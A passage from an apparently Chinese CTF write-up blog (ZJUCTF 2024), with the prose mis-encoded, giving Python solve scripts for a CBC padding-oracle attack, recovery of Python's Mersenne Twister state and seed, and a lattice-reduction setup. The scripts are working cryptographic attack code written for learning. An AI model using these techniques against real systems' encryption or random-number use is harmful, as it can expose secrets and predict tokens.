class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_head16_iv</span>(<span class="hljs-params">block</span>):<br>    tmp = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)):<br>        test = block+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">47</span>+<span class="hljs-built_in">bytes</span>([decryptlast^(<span class="hljs-number">79</span>-i)])+E5<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            iv = tmp+<span class="hljs-built_in">bytes</span>([j])+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">15</span>-<span class="hljs-built_in">len</span>(tmp))<br>            <span class="hljs-comment"># print(iv)</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(iv)==<span class="hljs-number">16</span><br>            <span class="hljs-keyword">if</span> verify(test,iv):<br>                tmp+=<span class="hljs-built_in">bytes</span>([j])<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            exit()<br>    <span class="hljs-keyword">return</span> tmp<br><br>IV = get_head16_iv(E1)<br><span class="hljs-keyword">assert</span> verify(aes_flag,IV)==<span class="hljs-number">1</span><br>E2_iv = get_head16_iv(E2)<br>E3_iv = get_head16_iv(E3)<br>E4_iv = get_head16_iv(E4)<br>E5_iv = get_head16_iv(E5)<br>flaglis = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag]<br>knownhead = <span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^knownhead[i]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^knownhead[i]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^knownhead[i]^E4_iv[i]<br>    flaglis[<span class="hljs-number">64</span>+i] = E4[i]^knownhead[i]^E5_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br>knowntail = <span class="hljs-string">b&quot;&#125;&quot;</span>+<span class="hljs-built_in">bytes</span>([last])*last<br>head_t5 = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    head_t5+=<span class="hljs-built_in">bytes</span>([E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]])<br>    flaglis[i+<span class="hljs-number">11</span>]=E5_iv[i+<span class="hljs-number">11</span>]^knowntail[i]^E4[i+<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>,<span class="hljs-number">16</span>):<br>    flaglis[<span class="hljs-number">16</span>+i] = E1[i]^head_t5[i-<span class="hljs-number">11</span>]^E2_iv[i]<br>    flaglis[<span class="hljs-number">32</span>+i] = E2[i]^head_t5[i-<span class="hljs-number">11</span>]^E3_iv[i]<br>    flaglis[<span class="hljs-number">48</span>+i] = E3[i]^head_t5[i-<span class="hljs-number">11</span>]^E4_iv[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flaglis]))<br></code></pre></td></tr></table></figure></li><li>ä½†æ˜¯æ¯ä¸ªå—çš„ä¸­é—´4ä¸ªæ•°æ®æ˜¯ä¸çŸ¥é“çš„ï¼Œä¸”å†³å®šäºç¬¬ä¸€ä¸ªå—çš„ä¸­é—´4ä¸ªæ•°æ®ï¼Œæ¯•ç«Ÿç»™äº†hashï¼Œçˆ†ç ´ä¸€ä¸‹å°±å‡ºæ¥äº†: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">combinations = itertools.product(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>, repeat=<span class="hljs-number">4</span>)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    head_i4 = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    tmp = flaglis.copy()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>):<br>        tmp[i] = <span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])<br>        tmp[<span class="hljs-number">16</span>+i] = E1[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E2_iv[i]<br>        tmp[<span class="hljs-number">32</span>+i] = E2[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E3_iv[i]<br>        tmp[<span class="hljs-number">48</span>+i] = E3[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E4_iv[i]<br>        tmp[<span class="hljs-number">64</span>+i] = E4[i]^<span class="hljs-built_in">ord</span>(head_i4[i-<span class="hljs-number">7</span>])^E5_iv[i]<br>    test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])<br>    <span class="hljs-keyword">if</span> sha256(test.encode()).hexdigest()==hash_flag:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/27.png"></li><li>è§£è¿™ç§CBCå¡«å……é¢˜ç›®è¿˜æ˜¯å¾ˆçˆ½çš„ğŸ˜›</li></ul><h2 id="seed">seed</h2><ul><li>è¿™æ˜¯ä¸€é“é€†å‘pythonçš„randomç§å­åˆå§‹åŒ–stateçš„é¢˜ç›®ï¼Œé¢˜ç›®ç»™äº† random çš„å‰ 624 ä¸ª 32 ä½çš„æ•°æ®ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªé€†å‘å‡ºrandomåœ¨è¯¥seedä¸‹çš„stateï¼Œç”¨RandCrackåº“å°±è¡Œï¼Œç„¶åæ ¹æ®<a href="https://www.anquanke.com/post/id/205861#h2-5">åšå®¢</a>é€†å‘æ—‹è½¬å¾—åˆ°æœ€åˆçš„stateï¼Œstateçš„ç¬¬0ä¸ªä¼šä¸ä¸€æ ·ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><span class="hljs-keyword">import</span> os<br><br>secret = os.urandom(<span class="hljs-number">16</span>)<br>test = Random()<br>test.seed(secret)<br><br>rc = RandCrack()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    rc.submit(test.getrandbits(<span class="hljs-number">32</span>))<br><span class="hljs-keyword">assert</span> test.getrandbits(<span class="hljs-number">32</span>)==rc.predict_getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrace</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res = tmp&amp;high<br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res    <br>    <span class="hljs-keyword">return</span> state<br><br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-comment"># print(inistate)</span><br><br>test = Random()<br>test.seed(secret)<br><span class="hljs-keyword">assert</span> test.getstate()[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]==<span class="hljs-built_in">tuple</span>(inistate[<span class="hljs-number">1</span>:])<br></code></pre></td></tr></table></figure></li><li>æ¥ä¸‹æ¥è¦æ ¹æ®stateé€†å‘seedï¼Œä½†æ˜¯pythonç”¨seedåˆå§‹åŒ–stateå¹¶ä¸ç­‰åŒäºMT19937ç”Ÿæˆçš„æ–¹æ³•ï¼Œåªå¥½å»å¯»æ‰¾pythonç”¨seedåˆå§‹åŒ–stateçš„æºä»£ç ï¼Œç„¶åæ ¹æ®è¿™ä¸ªä¸€æ­¥æ­¥é€†å‘å¾—åˆ°seedï¼Œå‘ç°pythonä¼šå°†seedè½¬æˆkeyæ•°ç»„å»å½±å“stateç”Ÿæˆï¼Œ<a href="https://stackered.com/blog/python-random-prediction/">åšå®¢</a>ä¸­æœ‰seedè½¬keylistç›¸å…³ä¿¡æ¯ï¼Œ<a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">github</a>ä¸Šæœ‰keylistå¾—åˆ°stateçš„è¿‡ç¨‹: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># only reverse for len(keylist)&lt;=624</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br>N = <span class="hljs-number">624</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geninit</span>(<span class="hljs-params">seed</span>):<br>    mt = [<span class="hljs-number">0</span>] * N<br>    mt[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, N):<br>        mt[i] = _int32(<span class="hljs-number">1812433253</span> * (mt[i - <span class="hljs-number">1</span>] ^ mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">key</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = geninit(<span class="hljs-number">19650218</span>)<br>    i,j = <span class="hljs-number">1</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))+ key[j] + j)<br>        i = i+<span class="hljs-number">1</span><br>        j = (j+<span class="hljs-number">1</span>)%<span class="hljs-built_in">len</span>(key)<br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N-<span class="hljs-number">1</span>):<br>        mt[i] = _int32((mt[i] ^ ((mt[i-<span class="hljs-number">1</span>] ^ (mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)) - i)<br>        i = i+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (i&gt;=N):<br>            mt[<span class="hljs-number">0</span>]=mt[-<span class="hljs-number">1</span>]<br>            i=<span class="hljs-number">1</span> <br>    mt[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80000000</span><br>    <span class="hljs-keyword">return</span> mt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseinit</span>(<span class="hljs-params">mt</span>):  <span class="hljs-comment"># len(keylist)&lt;=624</span><br>    mt = <span class="hljs-built_in">list</span>(mt)<br>    temp = _int32((mt[-<span class="hljs-number">1</span>]^(mt[-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>    mt[<span class="hljs-number">1</span>] = _int32(mt[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>)^temp<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1566083941</span>)<br>        mt[i] = _int32(mt[i]+i)^temp<br>    key = [-<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>)]  <span class="hljs-comment"># the key on index 0 and 1 and 623 can not be reversed</span><br>    mt2 = geninit(<span class="hljs-number">19650218</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>        temp = _int32(mt2[i]^((mt[i-<span class="hljs-number">1</span>]^(mt[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) * <span class="hljs-number">1664525</span>))<br>        key[i-<span class="hljs-number">1</span>] = (mt[i]-temp)%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment"># print(key)  # now key stores the key[j] + j</span><br>    <span class="hljs-comment"># guess the term of the key,it will fails when 621&lt;=len(keylist)&lt;=624</span><br>    <span class="hljs-comment"># i only use simple check for the term,since it is almost impossible to have the same value in a keylist</span><br>    term = key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;keylenth:&quot;</span>,term)<br>    keylist = []<br>    <span class="hljs-keyword">if</span> (term&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> term&gt;<span class="hljs-number">620</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed to guess the keylist&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">1</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">elif</span> (term==<span class="hljs-number">2</span>):<br>        keylist.append(key[<span class="hljs-number">2</span>])<br>        keylist.append(key[<span class="hljs-number">3</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    <span class="hljs-keyword">else</span>:<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">2</span>])<br>        keylist.append(key[key.index(key[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)-<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(term-<span class="hljs-number">2</span>):<br>            keylist.append(key[<span class="hljs-number">2</span>+i]-<span class="hljs-number">2</span>-i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;guess:&quot;</span>,keylist)<br>    seed = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(keylist)):<br>        seed += keylist[i] &lt;&lt; (<span class="hljs-number">32</span>*i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;seed in number mode:&quot;</span>,seed)<br>    <span class="hljs-keyword">return</span> seed<br><br>reverseinit(init([<span class="hljs-number">1701601646</span>,<span class="hljs-number">1</span>]))<br>random.seed(<span class="hljs-number">214097309740939471387164918734691</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><br>random.seed(<span class="hljs-string">&quot;my seed&quot;</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># key = [3358881470, 2670804673, 4256210531, 4085415016, 2014628229, 2984896648, 2837766904, 534869515, 3396683863, 1732457832, 679200103, 2879791640, 4054140216, 3129555524, 1092970275, 3225866273, 1936024932, 7174432]</span><br>random.seed(<span class="hljs-string">b&#x27;ZJUCTF&#123;&#x27;</span>+<span class="hljs-string">b&quot;*&quot;</span>*<span class="hljs-number">72</span>+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])))<br></code></pre></td></tr></table></figure></li><li>ç”¨fakeflagæµ‹è¯•äº†ä¸‹ï¼Œå‘ç°å¯ä»¥ï¼Œé‚£å°±æŠŠé¢˜ç›®ä¸­çš„æ–‡ä»¶éšæœºæ•°å¯¼å…¥å³å¯ï¼ˆæ³¨æ„å¦‚æœç”¨bytes arrayåˆå§‹åŒ–é‚£ä¹ˆkeylistè¿˜è¦åŠ ä¸Šhashå€¼ï¼‰: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br>rc = RandCrack()<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./seed/leak&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rc.submit(<span class="hljs-built_in">int</span>(i[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>))<br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(inistate)))<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/28.png"> <div class="note note-info">            <p>ç½‘ä¸Šå¥½åƒæœ‰ç°æˆç ´è§£seedçš„ä»£ç ã€‚ã€‚ã€‚</p>          </div></li></ul><h2 id="nsa">NSA</h2><ul><li><p>çŸ¥é“æ ¼åŸºè§„çº¦å°±èƒ½æŠŠè¿™é“é¢˜ç§’äº†ï¼Œç”±äºxå’Œaçš„å¤§å°ç›¸å·®å¾ˆå¤§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ çŸ©é˜µ(è®°åŸ<span class="math inline">\(s\ //\ n=t\)</span>): <span class="math display">\[  \begin{bmatrix}  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 1  \end{bmatrix}  \times  \begin{bmatrix}  1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_1 \\  0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_2 \\  0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; a_3 \\  0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; a_4 \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; a_5 \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; -n \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; -s  \end{bmatrix}  \]</span></p></li><li><p>å¾—åˆ°ç»“æœï¼š <span class="math display">\[  \begin{bmatrix}  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 0  \end{bmatrix}  \]</span></p></li><li><p>ç”±äºç»“æœçš„é•¿åº¦è¿œå°äºçŸ©é˜µä¸­a,n,sçš„é•¿åº¦ï¼Œç›´æ¥å¯¹è¯¥çŸ©é˜µè¿›è¡Œæ ¼åŸºè§„çº¦ï¼Œé‚£ä¹ˆç»“æœå°±å¯èƒ½æ˜¯å¤„ç†åçŸ©é˜µçš„æŸä¸€è¡Œ: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> randbits<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">1973262420438951967320857357182009152091259685060976722964606060415762941212963496173787803818132496094383083809617106382186584091024192880722074907992491367450376544013030959022137871119305973124950248142047263035635704712183940295643931582521870194436601800272104155213299635342758552485316790832579867297150676449480377301711550092169821139312777545087931190076223860806667206368445038374040009303216695843074552565472224259513347471048389711982387187929358080134259118116803904926037703226659436288017803262824150053323837281123708147514697839476472493444001359537263470035147822515533236213306871187789861137864</span><br>s = <span class="hljs-number">25968545790292770927664439022039737990740822274703473845844930805491973210053546757650612526671426169052862599487679523347480169973953855077248798990354540626902441004340668118824647635652733202266038565469480686593639141386160897997041025319530312635817177211940935304195338733597108954253489362890509953008579795465614477856365008523630015461376982331314525043834068281293242866988185504701331075706296655857609737273305897051800777391003779592347329297992465517975455425494933095449106283240537673407217335317072671448690092359553841225872584507479466178655269973803840975113771278026055850135141677845388049546</span><br>a = [<span class="hljs-number">10408175307348227837634927663895071529476747502502185137513974921146145423682039533172426778936636358324323912788471069026035168778419976679080184413445271720845102618347963190848191065559646770751655277489531629085722243398071815514153232748524230263971369717467799896204740816910663354935597598214850905156314156887989538373959310497944747453576532357871371863075761014213384743918508858141163976218524522607305196842635916581744439316075721739180965470299311350393451063367829414121337156065063861518282124855164605728530156876267682012313606474074632758901489079434948149811390226852506471410549293073583094154314</span>, <span class="hljs-number">28269560384960198129459464824168904454093533799427373719101958152830149304079535609840503045418817577271339506559708826732505096765044117971395637414798033477281664349092452395201698366996248139565797081925288330110757163731306944864404131792462548050708767759391940119750713119508122181663178044139268149581082597178199687276079353808439331728293658408631700475635429921342830354715878323660002459279064928181750787407060944131659356624300053929897005824524609929688237355990980427613559070550439812162019187800018233621385797936453990170736247405871997771020602086874659014802758833220985543027634931320965118936782</span>, <span class="hljs-number">10625741788931007858303888830659148422354013378542985927696595777152340414854015279971842010883421053720353641812187868653213235312353892555970563177558988599107933633340735864486222364110270557367311389846076836771083415281846163998654380752623282253778094553911643806578968196883934713435987257460863616962447383892032157500229307681280131430912764656808726260928234722038626955873788364902558250972328382020856810352543862191220046884387107630101992556872008805981866862802982658955378648983437460740234334042235547472682932431773316024845941192812705881982892857027525142349379964285721568460303629823752967342887</span>, <span class="hljs-number">466513131390636645643900269891214946444047706245650824135253103614265978612953404725019381500993893845145617053401585161990958374796943199099538435861351496258557099896861385401969983387062345279712657806192329411762748881795342790969236194712072681142002072072680828453443357328016687844228861613794298560379205793274077841700937160925811964857910585432339248824064598338134101699312973992616278479768665180694250521743161214366283362781594396414837969921707567615116413598691531290859926550159099552968634136977992540573210466243951997484516747810672360389301753992051382855018984004441058675996738943205371672373</span>, 